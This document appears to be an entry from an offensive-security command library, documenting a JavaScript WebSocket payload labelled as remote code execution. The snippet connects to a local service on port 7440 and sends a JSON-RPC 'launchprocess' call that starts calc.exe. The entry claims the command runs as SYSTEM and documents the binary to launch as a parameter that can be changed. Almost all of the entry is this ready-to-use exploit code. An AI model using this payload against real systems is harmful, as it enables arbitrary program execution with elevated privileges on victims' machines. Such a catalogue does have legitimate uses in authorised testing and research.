---
id: cmd-websocket-launch
data: >-
  const ws = new WebSocket('ws://localhost:7440'); ws.onopen = () => {
  ws.send(JSON.stringify({jsonrpc: '2.0', method: 'launchprocess', params:
  {appName: 'calc.exe'}, id: 1})); };
tags:
  - rce
  - websocket
type: command
output: null
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:58.531Z'
verified: false
validated: true
submitted: true
---
# launchprocess-websocket

## Command

```javascript
const ws = new WebSocket('ws://localhost:7440'); ws.onopen = () => { ws.send(JSON.stringify({jsonrpc: '2.0', method: 'launchprocess', params: {appName: 'calc.exe'}, id: 1})); };
```

## Description

JavaScript snippet to connect via WebSocket and send launchprocess command for RCE.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| appName | Binary to launch | Yes |

## Examples

### Basic Usage

```javascript
const ws = new WebSocket('ws://localhost:7440'); ws.onopen = () => { ws.send(JSON.stringify({jsonrpc: '2.0', method: 'launchprocess', params: {appName: 'calc.exe'}, id: 1})); };
```

## Expected Output

WebSocket connection; command executed as SYSTEM.

## Related

- [[procedures/Remote-RCE-via-JavaScript-WebSocket-Payload]]
